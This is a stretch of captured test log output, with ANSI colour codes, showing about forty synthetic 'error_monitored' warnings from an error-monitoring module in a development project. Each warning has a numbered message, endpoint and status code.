WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757531Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1338'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757579Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1339'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1340'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1341'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757724Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1342'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757773Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1343'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757827Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1344'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757883Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1345'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1346'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.757986Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1347'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1348'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m27[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1349'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758133Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1350'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1351'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758300Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1352'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758376Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1353'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758447Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1354'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758541Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1355'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758604Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1356'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758657Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1357'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758711Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1358'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758763Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1359'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1360'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758862Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1361'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1362'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.758960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1363'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759011Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1364'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759059Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1365'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759124Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1366'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759213Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1367'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759273Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1368'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759330Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1369'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759381Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1370'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759431Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1371'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759481Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1372'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759530Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1373'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759584Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1374'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759915Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1375'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.759981Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1376'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760032Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1377'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
